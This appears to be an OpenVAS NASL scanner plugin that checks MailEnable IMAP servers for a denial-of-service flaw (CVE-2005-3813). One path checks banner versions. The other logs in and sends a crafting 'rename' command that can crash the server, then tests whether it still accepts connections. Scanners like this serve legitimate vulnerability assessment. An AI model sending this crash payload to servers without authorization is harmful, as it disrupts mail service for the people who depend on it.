# OpenVAS Vulnerability Test
# $Id: mailenable_imap_rename_dos.nasl 13467 2019-02-05 12:16:48Z cfischer $
# Description: MailEnable IMAP rename DoS Vulnerability
#
# Authors:
# Josh Zlatin-Amishav (josh at ramat dot cc)
#
# Copyright:
# Copyright (C) 2005 Josh Zlatin-Amishav
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20245");
  script_version("$Revision: 13467 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-05 13:16:48 +0100 (Tue, 05 Feb 2019) $");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");
  script_cve_id("CVE-2005-3813");
  script_bugtraq_id(15556);
  script_name("MailEnable IMAP rename DoS Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2005 Josh Zlatin-Amishav");
  script_dependencies("smtpserver_detect.nasl", "imap4_banner.nasl");
  script_require_ports("Services/smtp", 25, "Services/imap", 143);
  script_mandatory_keys("imap/banner/available", "smtp/mailenable/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/417589");
  script_xref(name:"URL", value:"http://www.mailenable.com/hotfix/MEIMAPS.ZIP");

  script_tag(name:"solution", value:"Apply the IMAP Cumulative Hotfix/Update provided in the
  referenced zip file.");

  script_tag(name:"summary", value:"The remote IMAP server is running MailEnable which is
  prone to denial of service attacks.");

  script_tag(name:"insight", value:"The IMAP server bundled with the version of MailEnable Professional
  or Enterprise Edition installed on the remote host is prone to crash due to incorrect handling of
  mailbox names in the rename command.");

  script_tag(name:"impact", value:"An authenticated remote attacker can exploit this flaw to crash the
  IMAP server on the remote host.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_banner_unreliable");

  exit(0);
}

include("imap_func.inc");
include("smtp_func.inc");
include("version_func.inc");
include("misc_func.inc");

if(safe_checks()) {

  port = get_smtp_port(default:25);

  banner = get_smtp_banner(port:port);
  if(banner =~ "Mail(Enable| Enable SMTP) Service") {
    # nb: Standard Edition seems to format version as "1.71--" (for 1.71),
    #     Professional Edition formats it like "0-1.2-" (for 1.2), and
    #     Enterprise Edition formats it like "0--1.1" (for 1.1).
    ver = eregmatch(pattern:"Version: (0-+)?([0-9][^- ]+)-*", string:banner, icase:TRUE);
    if(!ver)
      exit(0);

    if(isnull(ver[1])) {
      edition = "Standard Edition";
    }
    else if(ver[1] == "0-") {
      edition = "Professional Edition";
    }
    else if (ver[1] == "0--") {
      edition = "Enterprise Edition";
    }
    if(!edition) {
      exit(0);
    }

    ver = ver[2];

    if((edition == "Professional Edition" && ver =~ "^1\.([0-6]|7$)") || # nb: Professional versions <= 1.7 may be vulnerable.
       (edition == "Enterprise Edition" && ver =~ "^1\.(0|1$)")) { # nb: Enterprise versions <= 1.1 may be vulnerable.
      report = report_fixed_ver(installed_version:ver + " " + edition, fixed_version:"See references");
      security_message(port:port, data:report);
      exit(0);
    }
    exit(99);
  }
  exit(0);
}
# Otherwise, try to exploit it.
else {

  kb_creds = imap_get_kb_creds();
  user = kb_creds["login"];
  pass = kb_creds["pass"];
  if(!user || !pass)
    exit(0);

  port = get_imap_port(default:143);
  banner = get_imap_banner(port:port);
  if(!banner || "* OK IMAP4rev1 server ready" >!< banner)
    exit(0);

  tag = 0;
  soc = open_sock_tcp(port);
  if(!soc)
    exit(0);

  s = recv_line(socket:soc, length:1024);
  if(!s || "IMAP4rev1 server ready at" >!< s ) {
    close(soc);
    exit(0);
  }

  vtstrings = get_vt_strings();

  ++tag;
  resp = NULL;
  c = string(vtstrings["lowercase"], string(tag), " LOGIN ", user, " ", pass);

  send(socket:soc, data:string(c, "\r\n"));
  while(s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);

    m = eregmatch(pattern:string("^", vtstrings["lowercase"], string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if(!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  if(resp && resp =~ "OK") {
    ++tag;
    resp = NULL;
    ++tag;
    payload = string(vtstrings["lowercase"], string(tag), " rename foo bar");
    send(socket:soc, data:string(payload, "\r\n"));
    # nb: It may take some time for the remote connection to close and refuse new connections
    sleep(5);
    soc2 = open_sock_tcp(port);

    if(!soc2) {
      security_message(port:port);
      exit(0);
    }
    close(soc2);
  }
}
